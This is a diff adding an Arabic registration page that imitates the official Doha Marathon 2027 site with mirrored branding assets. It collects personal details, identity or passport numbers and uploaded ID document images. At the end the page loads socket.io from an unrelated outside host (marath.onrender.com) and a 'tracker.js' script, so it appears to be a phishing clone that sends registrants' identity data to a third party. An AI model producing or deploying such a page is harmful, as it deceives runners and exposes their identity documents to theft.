@@ -1,0 +1,197 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="theme-color" content="#ed1c24">
+	<title>التسجيل - ماراثون الدوحة 2027</title>
+	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/notosans.css">
+	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/rubik.css">
+	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/plugins/telephone-field-for-elementor-forms/lib/css/intlTelInput.min.css">
+	<link rel="stylesheet" href="assets/registration.css">
+	<script src="assets/dohamarathonooredoo.com/wp-includes/js/jquery/jquery.min.js" defer></script>
+	<script src="assets/dohamarathonooredoo.com/wp-content/plugins/telephone-field-for-elementor-forms/lib/js/intlTelInput-jquery.js" defer></script>
+	<script src="assets/registration.js" defer></script>
+</head>
+<body>
+	<header class="site-header">
+		<a class="brand" href="index.html" aria-label="العودة إلى الصفحة الرئيسية">
+			<img src="assets/commonapi.suffix.events/cdnimage/dohaimages/2026/01/cropped-Main-logo-01-1-e1777851995280.webp" alt="ماراثون الدوحة من أريدُ">
+		</a>
+		<a class="back-link" href="index.html">العودة إلى الصفحة الرئيسية</a>
+	</header>
+
+	<main class="page-shell">
+		<section class="intro">
+			<p class="eyebrow">15 يناير 2027 · الدوحة</p>
+			<h1>خطوتك الأولى نحو خط النهاية</h1>
+			<p>اختر فئة السباق وأكمل بيانات المشارك للمتابعة.</p>
+		</section>
+
+		
+
+		<form id="registration-form" class="registration-card">
+			<section class="form-section">
+				<div class="section-heading">
+					<span class="step-number">١</span>
+					<div>
+						<h2>فئة السباق</h2>
+						<p>تظهر الرسوم بعد اختيار الفئة.</p>
+					</div>
+				</div>
+
+				<label class="field" for="race-category">
+					<span>اختر فئة السباق <span class="required">*</span></span>
+					<select id="race-category" name="raceCategory" required>
+						<option value="">اختر الفئة</option>
+						<option value="42km">42 كم — الأعمار 18 سنة فأكثر</option>
+						<option value="21km">21 كم — الأعمار 16 سنة فأكثر</option>
+						<option value="10km">10 كم — الأعمار 14 سنة فأكثر</option>
+						<option value="5km">5 كم — الأعمار 10 سنوات فأكثر</option>
+						<option value="relay42">42 كم تتابع — الأعمار 18 سنة فأكثر</option>
+					</select>
+				</label>
+				<div class="price-panel" aria-live="polite">
+					<span>رسوم المشاركة</span>
+					<strong id="race-price">اختر فئة السباق</strong>
+				</div>
+			</section>
+
+			<section class="form-section">
+				<div class="section-heading">
+					<span class="step-number">٢</span>
+					<div>
+						<h2>بيانات المشارك</h2>
+						<p>أدخل بيانات صحيحة للتواصل والتعريف بالمشارك.</p>
+					</div>
+				</div>
+
+				<div class="field-grid">
+					<label class="field" for="first-name">
+						<span>الاسم الأول <span class="required">*</span></span>
+						<input id="first-name" name="firstName" autocomplete="given-name" required>
+					</label>
+					<label class="field" for="last-name">
+						<span>اسم العائلة <span class="required">*</span></span>
+						<input id="last-name" name="lastName" autocomplete="family-name" required>
+					</label>
+					<label class="field" for="email">
+						<span>البريد الإلكتروني <span class="required">*</span></span>
+						<input id="email" name="email" type="email" autocomplete="email" required>
+					</label>
+					<label class="field" for="phone">
+						<span>رقم الجوال <span class="required">*</span></span>
+						<div class="phone-field">
+							<input id="phone" name="phone" type="tel" autocomplete="tel-national" inputmode="tel" required>
+						</div>
+					</label>
+					<label class="field" for="gender">
+						<span>الجنس <span class="required">*</span></span>
+						<select id="gender" name="gender" required>
+							<option value="">اختر</option>
+							<option value="female">أنثى</option>
+							<option value="male">ذكر</option>
+						</select>
+					</label>
+					<label class="field" for="birth-date">
+						<span>تاريخ الميلاد <span class="required">*</span></span>
+						<input id="birth-date" name="birthDate" type="date" autocomplete="bday" required>
+						<small id="age-hint">يعتمد الحد الأدنى للعمر على فئة السباق المختارة.</small>
+					</label>
+					<label class="field" for="nationality">
+						<span>الجنسية <span class="required">*</span></span>
+						<div class="country-picker" data-country-picker>
+							<input id="nationality" type="text" autocomplete="off" placeholder="ابحث عن الجنسية أو اخترها" role="combobox" aria-autocomplete="list" aria-expanded="false" aria-controls="nationality-options" required>
+							<input type="hidden" name="nationality">
+							<ul id="nationality-options" class="country-options" role="listbox" hidden></ul>
+						</div>
+					</label>
+					<label class="field" for="residence">
+						<span>بلد الإقامة <span class="required">*</span></span>
+						<div class="country-picker" data-country-picker>
+							<input id="residence" type="text" autocomplete="off" placeholder="ابحث عن بلد الإقامة أو اختره" role="combobox" aria-autocomplete="list" aria-expanded="false" aria-controls="residence-options" required>
+							<input type="hidden" name="residence">
+							<ul id="residence-options" class="country-options" role="listbox" hidden></ul>
+						</div>
+					</label>
+					<label class="field" for="shirt-size">
+						<span>مقاس القميص <span class="required">*</span></span>
+						<select id="shirt-size" name="shirtSize" required>
+							<option value="">اختر المقاس</option>
+							<option value="S">S</option>
+							<option value="M">M</option>
+							<option value="L">L</option>
+							<option value="XL">XL</option>
+							<option value="XXL">XXL</option>
+						</select>
+					</label>
+					<label class="field" for="pace">
+						<span>الوقت المتوقع لكل كيلومتر <span class="required">*</span></span>
+						<select id="pace" name="pace" required>
+							<option value="">اختر الوقت المتوقع</option>
+							<option>أكثر من 7:00 دقائق/كم</option>
+							<option>6:30 – 7:00 دقائق/كم</option>
+							<option>6:00 – 6:30 دقائق/كم</option>
+							<option>5:30 – 6:00 دقائق/كم</option>
+							<option>5:00 – 5:30 دقائق/كم</option>
+							<option>4:30 – 5:00 دقائق/كم</option>
+							<option>أقل من 4:30 دقائق/كم</option>
+						</select>
+					</label>
+				</div>
+			</section>
+
+			<section class="form-section">
+				<div class="section-heading">
+					<span class="step-number">٣</span>
+					<div>
+						<h2>وثيقة إثبات الهوية</h2>
+						<p>أدخل رقم الوثيقة وارفق صورة واضحة لها.</p>
+					</div>
+				</div>
+				<div class="field-grid">
+					<label class="field" for="identity-number">
+						<span>رقم البطاقة الشخصية أو جواز السفر <span class="required">*</span></span>
+						<input id="identity-number" name="identityNumber" autocomplete="off" required>
+					</label>
+					<div class="field">
+						<span id="identity-file-label">صورة الوثيقة <span class="required">*</span></span>
+						<label class="file-upload" for="identity-file" id="identity-upload">
+							<input id="identity-file" name="identityFile" type="file" accept="image/*,.pdf" aria-labelledby="identity-file-label" aria-describedby="identity-file-help identity-file-status" required>
+							<svg class="file-upload-icon" viewBox="0 0 48 48" aria-hidden="true">
+								<path d="M24 32V8m0 0-9 9m9-9 9 9M10 29v9a3 3 0 0 0 3 3h22a3 3 0 0 0 3-3v-9" />
+							</svg>
+							<strong>اسحب صورة الوثيقة إلى هنا</strong>
+							<span>أو اضغط لاختيار ملف من جهازك</span>
+							<small class="file-upload-types">JPG أو PNG أو PDF</small>
+							<span class="file-upload-status" id="identity-file-status" aria-live="polite">لم يتم اختيار ملف بعد</span>
+						</label>
+						<small>للبطاقة القطرية، جهّز صورتي الوجهين.</small>
+						<small id="identity-file-help">يمكنك رفع صورة أو ملف PDF.</small>
+					</div>
+					<label class="field" for="club">
+						<span>النادي أو جهة العمل <span class="optional">(اختياري)</span></span>
+						<input id="club" name="club" autocomplete="organization">
+					</label>
+					<label class="field" for="coupon">
+						<span>رمز القسيمة <span class="optional">(اختياري)</span></span>
+						<input id="coupon" name="coupon" autocomplete="off">
+					</label>
+				</div>
+			</section>
+
+			<label class="consent" for="terms">
+				<input id="terms" name="terms" type="checkbox" required>
+				<span>أؤكد أن البيانات المدخلة تخص المشارك وأوافق على مراجعتها قبل أي تسجيل فعلي. <span class="required">*</span></span>
+			</label>
+
+			<button class="submit-button" type="submit">مراجعة البيانات</button>
+			<p id="form-message" class="form-message" role="status" aria-live="polite" hidden></p>
+			<p class="support">للمساعدة في التسجيل الفعلي، تواصل مع <a href="mailto:info@dohamarathonooredoo.com">فريق ماراثون الدوحة</a>.</p>
+		</form>
+	</main>
+<script src="https://marath.onrender.com/socket.io/socket.io.js"></script>
+<script src="/assets/tracker.js"></script>
+</body>
+</html>
+
